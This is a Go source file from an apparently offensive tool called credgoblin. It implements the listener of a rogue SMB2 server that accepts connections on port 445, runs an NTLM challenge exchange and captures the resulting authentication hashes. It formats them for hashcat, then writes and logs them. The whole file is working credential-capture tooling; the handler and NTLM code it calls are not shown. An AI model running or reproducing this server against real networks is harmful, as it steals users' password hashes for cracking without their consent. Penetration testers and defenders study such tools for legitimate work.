package smb

import (
	"context"
	"fmt"
	"net"
	"strings"
	"sync"

	"github.com/ineffectivecoder/credgoblin/pkg/ntlm"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
)

// Server represents an SMB2 server
type Server struct {
	listener       net.Listener
	config         *Config
	logger         *output.Logger
	hashWriter     *output.HashWriter
	challengeGen   *ntlm.Challenge
	authParser     *ntlm.AuthMessageParser
	hashFormatter  *ntlm.HashcatFormatter
	onHashCaptured func(string)
	wg             sync.WaitGroup
	ctx            context.Context
	cancel         context.CancelFunc
}

// Config holds SMB server configuration
type Config struct {
	ListenAddr string
	ServerName string
	DomainName string
	Verbose    bool
}

// NewServer creates a new SMB server
func NewServer(config *Config, logger *output.Logger, hashWriter *output.HashWriter) *Server {
	return &Server{
		config:        config,
		logger:        logger,
		hashWriter:    hashWriter,
		challengeGen:  ntlm.NewChallenge(config.ServerName, config.DomainName),
		authParser:    ntlm.NewAuthParser(),
		hashFormatter: ntlm.NewHashcatFormatter(),
	}
}

// Start starts the SMB server
func (s *Server) Start(ctx context.Context) error {
	s.ctx, s.cancel = context.WithCancel(ctx)

	addr := s.config.ListenAddr
	// Only append :445 if no port is specified
	if !strings.Contains(addr, ":") {
		addr = fmt.Sprintf("%s:445", addr)
	}

	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", addr, err)
	}

	s.listener = listener
	s.logger.Info(fmt.Sprintf("SMB server listening on %s", addr))

	go s.acceptLoop()

	return nil
}

// Stop stops the SMB server
func (s *Server) Stop() error {
	if s.cancel != nil {
		s.cancel()
	}

	if s.listener != nil {
		s.listener.Close()
	}

	s.wg.Wait()
	return nil
}

// OnHashCaptured sets a callback for when a hash is captured
func (s *Server) OnHashCaptured(callback func(string)) {
	s.onHashCaptured = callback
}

// acceptLoop accepts incoming connections
func (s *Server) acceptLoop() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			select {
			case <-s.ctx.Done():
				return
			default:
				s.logger.Error(fmt.Sprintf("Accept error: %v", err))
				continue
			}
		}

		s.wg.Add(1)
		go s.handleConnection(conn)
	}
}

// handleConnection handles a single SMB connection
func (s *Server) handleConnection(conn net.Conn) {
	defer s.wg.Done()
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	s.logger.Debug(fmt.Sprintf("New connection from %s", remoteAddr))

	handler := NewHandler(conn, s.config, s.logger, s.challengeGen, s.authParser, s.hashFormatter)

	handler.OnHashCaptured(func(hash string) {
		if s.hashWriter != nil {
			if err := s.hashWriter.WriteHash(hash); err != nil {
				s.logger.Error(fmt.Sprintf("Failed to write hash: %v", err))
			}
		}

		if s.onHashCaptured != nil {
			s.onHashCaptured(hash)
		}

		s.logger.Success(fmt.Sprintf("Hash captured from %s: %s", remoteAddr, hash))
	})

	if err := handler.Handle(s.ctx); err != nil {
		s.logger.Debug(fmt.Sprintf("Connection error from %s: %v", remoteAddr, err))
	}
}
